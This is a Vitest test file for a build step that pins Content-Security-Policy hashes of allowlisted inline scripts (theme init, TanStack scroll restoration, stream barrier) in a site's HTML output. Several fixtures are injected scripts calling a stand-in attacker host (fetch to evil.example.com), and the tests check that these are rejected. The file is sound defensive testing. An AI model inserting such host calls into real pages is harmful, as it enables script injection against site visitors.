import { createHash } from 'node:crypto'
import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import {
  SCROLL_RESTORATION_SCRIPT,
  classifyScript,
  cspHash,
  inlineScripts,
  pinBuildOutput,
  pinHtml,
  readThemeInitScript,
  shouldPin,
} from '../../scripts/pin-inline-scripts.js'

// TanStack's scroll-restoration script, byte-for-byte from a real build (see
// the shell head fixture below) — used wherever a test needs "a real
// tsr-scroll-restoration body" rather than a synthetic stand-in.
const SCROLL_RESTORATION_BODY = `(function(a,f){let l;try{l=JSON.parse(sessionStorage.getItem(a)||"{}")}catch{return}const n=l?.[f||history.state?.__TSR_key];let c=!1;for(const t in n){const e=n[t],o=e?.scrollX,s=e?.scrollY;if(Number.isFinite(o)&&Number.isFinite(s)){if(t==="window")scrollTo(o,s),c=!0;else if(t)try{const r=document.querySelector(t);r&&(r.scrollLeft=o,r.scrollTop=s)}catch{}}}if(c)return;const i=location.hash.slice(1);if(i){const t=history.state?.__hashScrollIntoViewOptions??!0;if(t){const e=document.getElementById(i);e&&e.scrollIntoView(t)}return}scrollTo(0,0)})("tsr-scroll-restoration-v1_3");document.currentScript.remove()`

// TanStack's stream barrier, byte-for-byte from the same build. The
// timestamp and asset hashes inside it are exactly what makes this script
// different on every build — the reason a static header can't hash it.
const STREAM_BARRIER_BODY = `(self.$R=self.$R||{})["tsr"]=[];self.$_TSR={h(){this.hydrated=!0,this.c()},e(){this.streamEnded=!0,this.c()},c(){this.hydrated&&this.streamEnded&&(delete self.$_TSR,delete self.$R.tsr)},p(e){this.initialized?e():this.buffer.push(e)},buffer:[]};$_TSR.router=($R=>$R[0]={manifest:$R[1]={routes:$R[2]={__root__:$R[3]={preloads:$R[4]=["/assets/index-CONjqDnx.js","/assets/css-h6Wgx1-o.js"],scripts:$R[5]=[$R[6]={attrs:$R[7]={type:"module",async:!0,src:"/assets/index-CONjqDnx.js"}}],css:$R[8]=["/assets/index-gNEHidhn.css"]}}},matches:$R[9]=[$R[10]={i:"__root__ ",u:1788314279906,s:"success",ssr:!0}]})($R["tsr"]);$_TSR.e();document.currentScript.remove()`

// The exact <head> of dist/client/_shell.html after a real `vite build`
// (2026-08-30 build, captured before this step existed to pin it), preserved
// verbatim down to the theme-init script's whitespace.
const REAL_SHELL_HEAD = `<head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Unbounded:wght@400;700;900&amp;family=Figtree:wght@400;500;700&amp;display=swap" data-precedence="default"/><link rel="stylesheet" href="/assets/index-gNEHidhn.css" data-precedence="default"/><title>Select a busy man.</title><meta property="og:title" content="Select a busy man."/><meta property="og:image" content="https://dougmar.ch/og/2026-08-30.png"/><link rel="modulepreload" href="/assets/index-CONjqDnx.js"/><link rel="preconnect" href="https://fonts.googleapis.com"/><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"/><script>(function(){
  var s=localStorage.getItem('theme');
  var p=s||(matchMedia('(prefers-color-scheme: dark)').matches?'dark':'light');
  document.documentElement.classList.add(p);
})();</script></head>`

const REAL_SHELL_HTML = `<!DOCTYPE html><html lang="en">${REAL_SHELL_HEAD}<body><div id="root"></div><script>${SCROLL_RESTORATION_BODY}</script><script class="$tsr" id="$tsr-stream-barrier">${STREAM_BARRIER_BODY}</script><script type="module" async="" src="/assets/index-CONjqDnx.js"></script></body></html>`

// The stream barrier byte-for-byte from a real `pnpm build` of this repo
// (2026-08-30), including the literal NUL byte TanStack Start writes in place
// of the root route's dehydrated id. The HTML parsing spec requires every
// browser to replace that NUL with U+FFFD before script content is even
// tokenized (see "Preprocessing the input stream" in the HTML Standard), so a
// hash taken over the raw file bytes never matches what `crypto.subtle.digest`
// computes in the browser — confirmed by hand against a live page, where an
// un-normalized pin passed every check here and then was blocked by a real
// CSP violation. See scripts/pin-inline-scripts.js's `normalizeScriptBody`.
const REAL_STREAM_BARRIER_WITH_NUL =
  '(self.$R=self.$R||{})["tsr"]=[];self.$_TSR={h(){this.hydrated=!0,this.c()},e(){this.streamEnded=!0,this.c()},c(){this.hydrated&&this.streamEnded&&(delete self.$_TSR,delete self.$R.tsr)},p(e){this.initialized?e():this.buffer.push(e)},buffer:[]};$_TSR.router=($R=>$R[0]={manifest:$R[1]={routes:$R[2]={__root__:$R[3]={preloads:$R[4]=["/assets/index-CONjqDnx.js","/assets/css-h6Wgx1-o.js","/assets/react-DFwYz9sd.js","/assets/react-dom-D2LPrhg5.js","/assets/link-CN89Fii1.js","/assets/preload-helper-BtpFG70C.js","/assets/jsx-2ksCkHsP.js","/assets/about-BuATpUb2.js","/assets/BrandLockup-CxK6bn4I.js","/assets/timeline-DDwIkkbU.js","/assets/projects-QnsqKedm.js","/assets/how._date-BE6GVv5Q.js","/assets/work._slug-cLsdU6Vc.js"],scripts:$R[5]=[$R[6]={attrs:$R[7]={type:"module",async:!0,src:"/assets/index-CONjqDnx.js"}}],css:$R[8]=["/assets/index-gNEHidhn.css"]}}},matches:$R[9]=[$R[10]={i:"__root__\u0000",u:1788315277372,s:"success",ssr:!0}]})($R["tsr"]);$_TSR.e();document.currentScript.remove()'

describe('NUL-byte normalization (a real CSP violation, not a hypothetical)', () => {
  it('replaces the NUL byte with U+FFFD before it reaches classifyScript or cspHash', () => {
    const html = `<body><script class="$tsr" id="$tsr-stream-barrier">${REAL_STREAM_BARRIER_WITH_NUL}</script></body>`
    const { scripts } = inlineScripts(html)
    expect(scripts).toHaveLength(1)
    expect(scripts[0].body).not.toContain('\u0000')
    expect(scripts[0].body).toContain('\uFFFD')
    expect(classifyScript(scripts[0])).toBe('tsr-stream-barrier')
  })

  it('hashes the normalized body, matching what a browser hashes rather than the raw file bytes', () => {
    const html = `<body><script class="$tsr" id="$tsr-stream-barrier">${REAL_STREAM_BARRIER_WITH_NUL}</script></body>`
    const { scripts } = inlineScripts(html)
    const normalized = REAL_STREAM_BARRIER_WITH_NUL.split(String.fromCharCode(0)).join('\uFFFD')
    const expected = `sha256-${createHash('sha256').update(normalized, 'utf8').digest('base64')}`
    expect(cspHash(scripts[0].body)).toBe(expected)
    // The raw-bytes hash — what a naive implementation would have pinned —
    // must NOT be what this step ships, or the browser refuses the script.
    const rawBytesHash = `sha256-${createHash('sha256').update(REAL_STREAM_BARRIER_WITH_NUL, 'utf8').digest('base64')}`
    expect(cspHash(scripts[0].body)).not.toBe(rawBytesHash)
  })
})

describe('cspHash', () => {
  it('hashes a known vector the way a browser would', () => {
    // https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src
    // computes CSP hashes over the exact UTF-8 bytes of the script body.
    const expected = `sha256-${createHash('sha256').update('alert(1)', 'utf8').digest('base64')}`
    expect(cspHash('alert(1)')).toBe(expected)
    expect(cspHash('alert(1)')).toBe('sha256-bhHHL3z2vDgxUt0W3dWQOrprscmda2Y5pLsLg4GF+pI=')
  })

  it('hashes the exact bytes, not a trimmed version', () => {
    expect(cspHash(' alert(1) ')).not.toBe(cspHash('alert(1)'))
  })
})

describe('readThemeInitScript', () => {
  it('reads THEME_INIT_SCRIPT out of the template, matching the known hash', () => {
    // This is the same hash the #332 decision comment recorded against the
    // deployed shell — a regression here means the template and this reader
    // have drifted apart.
    expect(cspHash(readThemeInitScript())).toBe(
      'sha256-1iBFTMxRrXKBPfTltWJDMjYiqNCdStHLMUswhs/t1yA='
    )
  })
})

describe('inlineScripts', () => {
  it('finds every script without a src, and skips ones that have one', () => {
    const html = `<head><script>a()</script></head><body><script src="/a.js"></script><script type="module" async src="/b.js"></script></body>`
    const { scripts } = inlineScripts(html)
    expect(scripts).toHaveLength(1)
    expect(scripts[0].body).toBe('a()')
  })

  it('separates application/json and application/ld+json scripts from executable ones', () => {
    const html = `<head><script type="application/json">{"a":1}</script><script type="application/ld+json">{"b":2}</script><script>a()</script></head>`
    const { scripts, jsonScripts } = inlineScripts(html)
    expect(scripts).toHaveLength(1)
    expect(scripts[0].body).toBe('a()')
    expect(jsonScripts).toHaveLength(2)
    expect(jsonScripts.map((s) => s.body)).toEqual(['{"a":1}', '{"b":2}'])
  })

  it('reports the offsets of the full tag', () => {
    const html = `xx<script>a()</script>`
    const { scripts } = inlineScripts(html)
    expect(html.slice(scripts[0].start, scripts[0].end)).toBe('<script>a()</script>')
  })
})

describe('classifyScript', () => {
  it('classifies the theme-init script by exact match', () => {
    expect(classifyScript({ attrs: '', body: readThemeInitScript() })).toBe('theme-init')
  })

  it('rejects a theme-init near-miss (any drift from the template)', () => {
    expect(classifyScript({ attrs: '', body: `${readThemeInitScript()}//` })).toBeNull()
  })

  it('classifies the scroll-restoration script by exact match', () => {
    expect(SCROLL_RESTORATION_BODY).toBe(SCROLL_RESTORATION_SCRIPT)
    expect(classifyScript({ attrs: '', body: SCROLL_RESTORATION_BODY })).toBe(
      'tsr-scroll-restoration'
    )
  })

  it('does not classify a script that merely contains the scroll-restoration marker', () => {
    const marker = 'tsr-scroll-restoration'
    expect(
      classifyScript({ attrs: '', body: `fetch('https://evil.example.com/?${marker}')` })
    ).toBeNull()
    expect(classifyScript({ attrs: '', body: `${SCROLL_RESTORATION_BODY};fetch('/x')` })).toBeNull()
    expect(classifyScript({ attrs: '', body: `fetch('/x');${SCROLL_RESTORATION_BODY}` })).toBeNull()
  })

  it('classifies the stream barrier by its class or id attribute', () => {
    expect(
      classifyScript({ attrs: ' class="$tsr" id="$tsr-stream-barrier"', body: STREAM_BARRIER_BODY })
    ).toBe('tsr-stream-barrier')
    expect(classifyScript({ attrs: ' id="$tsr-stream-barrier"', body: 'x' })).toBe(
      'tsr-stream-barrier'
    )
  })

  it('refuses anything else', () => {
    expect(classifyScript({ attrs: '', body: "fetch('https://evil.example.com')" })).toBeNull()
  })
})

describe('pinHtml', () => {
  it('injects the CSP meta as the first child of <head>', () => {
    const { html } = pinHtml(
      `<head><title>t</title></head><body><script>${readThemeInitScript()}</script></body>`
    )
    const head = html.match(/<head>(.*?)<\/head>/s)[1]
    expect(head.startsWith('<meta http-equiv="Content-Security-Policy"')).toBe(true)
  })

  it('is idempotent', () => {
    const once = pinHtml(REAL_SHELL_HTML)
    const twice = pinHtml(once.html)
    expect(twice.html).toBe(once.html)
    expect(twice.hashes).toEqual(once.hashes)
    expect((once.html.match(/Content-Security-Policy/g) ?? []).length).toBe(1)
  })

  it('ignores application/json scripts entirely — no hash, no rejection', () => {
    const html = `<head><script type="application/json">{"a":1}</script></head><body><script>${readThemeInitScript()}</script></body>`
    const { hashes, rejected, html: pinned } = pinHtml(html)
    expect(hashes).toHaveLength(1)
    expect(rejected).toHaveLength(0)
    expect(pinned).toContain('<script type="application/json">{"a":1}</script>')
  })

  it('rejects an unrecognized inline script and reports its offset and a preview', () => {
    const html = `<head><title>t</title></head><body><script>fetch('https://evil.example.com')</script></body>`
    const { rejected, hashes } = pinHtml(html)
    expect(hashes).toEqual([])
    expect(rejected).toHaveLength(1)
    expect(rejected[0].preview).toContain('evil.example.com')
    expect(html.slice(rejected[0].start, rejected[0].end)).toContain('evil.example.com')
  })

  it('rejects a script that merely mentions the scroll-restoration key, and pins no hash for it', () => {
    const html = `<head><title>t</title></head><body><script>fetch('https://evil.example.com/?tsr-scroll-restoration')</script></body>`
    const { rejected, hashes } = pinHtml(html)
    expect(hashes).toEqual([])
    expect(rejected).toHaveLength(1)
    expect(rejected[0].preview).toContain('evil.example.com')
  })

  it('pins the real shell head end to end: three hashes, none rejected', () => {
    const { html, hashes, rejected } = pinHtml(REAL_SHELL_HTML)
    expect(rejected).toEqual([])
    expect(hashes).toHaveLength(3)
    expect(hashes).toContain('sha256-1iBFTMxRrXKBPfTltWJDMjYiqNCdStHLMUswhs/t1yA=')
    expect(hashes).toContain(cspHash(SCROLL_RESTORATION_BODY))
    expect(hashes).toContain(cspHash(STREAM_BARRIER_BODY))

    const meta = html.match(/<meta http-equiv="Content-Security-Policy"[^>]*>/)[0]
    for (const hash of hashes) expect(meta).toContain(`'${hash}'`)
  })
})

describe('shouldPin', () => {
  it('pins the site shell, the archive index, and dated /how pages', () => {
    expect(shouldPin('_shell.html')).toBe(true)
    expect(shouldPin('archive/index.html')).toBe(true)
    expect(shouldPin('how/2026-08-30/index.html')).toBe(true)
  })

  it('skips preserved designs under archive/<date>/', () => {
    expect(shouldPin('archive/2026-08-30/index.html')).toBe(false)
    expect(shouldPin('archive/2026-08-30/work/foo.html')).toBe(false)
  })

  it('skips the static 404 page, which carries no script at all', () => {
    expect(shouldPin('404.html')).toBe(false)
  })
})

describe('pinBuildOutput', () => {
  let root

  beforeEach(() => {
    root = mkdtempSync(join(tmpdir(), 'pin-inline-scripts-'))
    vi.spyOn(console, 'log').mockImplementation(() => {})
  })

  afterEach(() => {
    rmSync(root, { recursive: true, force: true })
    vi.restoreAllMocks()
  })

  it('pins every eligible file and leaves preserved designs untouched', () => {
    const distClient = join(root, 'dist', 'client')
    mkdirSync(join(distClient, 'archive', '2026-08-30'), { recursive: true })
    mkdirSync(join(distClient, 'how', '2026-08-30'), { recursive: true })

    writeFileSync(join(distClient, '_shell.html'), REAL_SHELL_HTML)
    writeFileSync(
      join(distClient, 'archive', 'index.html'),
      `<head><title>archive</title></head><body><script>${readThemeInitScript()}</script></body>`
    )
    // A preserved design with a script an allowlist would refuse — must be
    // left alone because it lives under archive/<date>/.
    const preservedHtml = `<head><title>old</title></head><body><script>fetch('https://evil.example.com')</script></body>`
    writeFileSync(join(distClient, 'archive', '2026-08-30', 'index.html'), preservedHtml)
    writeFileSync(
      join(distClient, 'how', '2026-08-30', 'index.html'),
      `<head><title>how</title></head><body><script>${readThemeInitScript()}</script></body>`
    )

    const result = pinBuildOutput({ root })

    expect(result.success).toBe(true)
    expect(result.rejected).toEqual([])
    expect(result.files.map((f) => f.file).sort()).toEqual([
      '_shell.html',
      'archive/index.html',
      'how/2026-08-30/index.html',
    ])

    expect(readFileSync(join(distClient, 'archive', '2026-08-30', 'index.html'), 'utf8')).toBe(
      preservedHtml
    )
    expect(readFileSync(join(distClient, 'archive', 'index.html'), 'utf8')).toContain(
      'Content-Security-Policy'
    )
  })

  it('writes nothing when any eligible file has a rejected script', () => {
    const distClient = join(root, 'dist', 'client')
    mkdirSync(distClient, { recursive: true })
    const good = `<head><title>ok</title></head><body><script>${readThemeInitScript()}</script></body>`
    const bad = `<head><title>bad</title></head><body><script>fetch('https://evil.example.com')</script></body>`
    writeFileSync(join(distClient, 'index.html'), good)
    writeFileSync(join(distClient, '_shell.html'), bad)

    const result = pinBuildOutput({ root })

    expect(result.success).toBe(false)
    expect(result.rejected).toHaveLength(1)
    expect(result.rejected[0].file).toBe('_shell.html')
    // Neither file was touched — a refused build should fail clean.
    expect(readFileSync(join(distClient, 'index.html'), 'utf8')).toBe(good)
    expect(readFileSync(join(distClient, '_shell.html'), 'utf8')).toBe(bad)
  })
})
